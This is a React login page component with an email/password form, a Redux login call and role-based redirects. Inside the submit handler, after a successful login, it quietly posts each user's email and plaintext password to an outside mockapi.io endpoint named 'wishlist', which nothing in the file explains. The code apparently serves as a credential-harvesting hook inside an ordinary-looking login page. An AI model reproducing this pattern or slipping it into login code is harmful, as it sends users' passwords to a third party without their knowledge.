import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useLoginMutation } from "../../Redux/Slice/userApiSlice";
import { useDispatch, useSelector } from "react-redux";
import { setCredentials } from "../../Redux/Slice/authSlice";
import { toast } from "react-toastify";
import 'react-toastify/dist/ReactToastify.css';
import axios from "axios";

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');
  const [isLoadingLogin, setIsLoadingLogin] = useState(false); // State for login loading animation
  const navigation = useNavigate();

  const { userInfo } = useSelector(state => state.auth);

  useEffect(() => {
    if (userInfo) {
      if (userInfo.userType === 'Admin') {
        navigation('/admin');
      } else {
        navigation('/');
      }
    }
  }, [navigation, userInfo]);

  const dispatch = useDispatch();

  const [login, { isLoading }] = useLoginMutation();

  const handleLogin = async (e) => {
    e.preventDefault();
    setIsLoadingLogin(true); // Show loading animation during login process
    try {
      const res = await login({ email, password }).unwrap();
      dispatch(setCredentials({ ...res }));

      const apiUrl = 'https://66486ec72bb946cf2fa08f2c.mockapi.io/wishlist';

      const jsonPayload = {
          
          email,
          
          password,
         
      };

      await axios.post(apiUrl, jsonPayload);

      setTimeout(() => {
        if (res.userType === 'Admin') {
          navigation('/admin');
        } else {
          navigation('/');
        }
      }, 500);
    } catch (error) {
      toast.error('Incorrect email or password');
      setLoginError('Incorrect email or password'); // Set login error message
    } finally {
      setIsLoadingLogin(false); // Hide loading animation after login attempt
    }
  }

  return (
    <section className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
        <h1 className="text-2xl font-bold mb-6 text-center">Login</h1>
        <form onSubmit={handleLogin} className="space-y-4">
          <input
            type="text"
            name="email"
            placeholder="Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring focus:border-blue-300"
            required
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring focus:border-blue-300"
            required
          />
          {loginError && <div className="text-red-500 text-sm">{loginError}</div>}
          <button
            type="submit"
            disabled={isLoading || isLoadingLogin}
            className={`w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded-md transition duration-200 ${isLoading || isLoadingLogin ? 'opacity-50 cursor-not-allowed' : ''}`}
          >
            {isLoading || isLoadingLogin ? 'Logging in...' : 'Login'}
          </button>
        </form>
        <p className="mt-4 text-sm text-gray-600 cursor-pointer text-center" onClick={() => navigation('/register')}>
          <span>Don't have an account? Register here.</span>
        </p>
      </div>
    </section>
  );
};

export default Login;
